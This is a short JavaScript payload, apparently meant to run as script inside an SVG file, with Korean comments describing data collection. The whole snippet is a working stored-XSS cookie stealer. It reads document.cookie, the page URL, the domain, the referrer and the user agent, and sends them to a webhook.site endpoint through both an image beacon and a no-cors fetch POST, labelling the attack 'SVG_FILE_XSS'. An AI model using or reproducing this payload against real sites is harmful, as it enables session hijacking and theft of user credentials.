svg.script:

// 쿠키와 추가 정보 수집
var cookies = document.cookie;
var currentUrl = window.location.href;
var domain = document.domain;

// webhook으로 데이터 전송 (이미지 방식)
var img = new Image();
img.src = 'https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e?source=svg_xss&cookies=' + 
          encodeURIComponent(cookies) + 
          '&url=' + encodeURIComponent(currentUrl) + 
          '&domain=' + encodeURIComponent(domain) +
          '&timestamp=' + Date.now();

// fetch로도 더 자세한 정보 전송
var payload = {
  attack_vector: 'SVG_FILE_XSS',
  cookies: cookies,
  url: currentUrl,
  domain: domain,
  referrer: document.referrer,
  userAgent: navigator.userAgent,
  timestamp: new Date().toISOString()
};

fetch('https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e', {
  method: 'POST',
  mode: 'no-cors',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(payload)
}).catch(e => {
  console.log('Fetch failed, but image beacon should work');
});
